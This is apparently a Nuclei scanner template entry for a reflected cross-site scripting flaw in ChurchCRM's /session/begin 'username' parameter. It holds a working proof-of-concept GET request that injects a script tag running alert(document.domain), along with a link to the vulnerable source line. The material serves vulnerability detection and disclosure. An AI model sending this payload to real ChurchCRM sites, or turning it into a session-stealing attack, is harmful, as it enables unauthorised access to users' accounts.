# Nuclei Template: ChurchCRM - Cross-Site Scripting
**Template ID:** churchcrm-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`churchcrm-xss.yaml`)

## Vulnerability Information & PoC

## Description
A reflected cross-site scripting (XSS) vulnerability was discovered in ChurchCRM via the 'username' parameter in /session/begin.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## References
- https://github.com/ChurchCRM/CRM/blob/91cfa8eb00aef724705f5e038c236c146c6cf3a6/src/session/templates/begin-session.php#L39
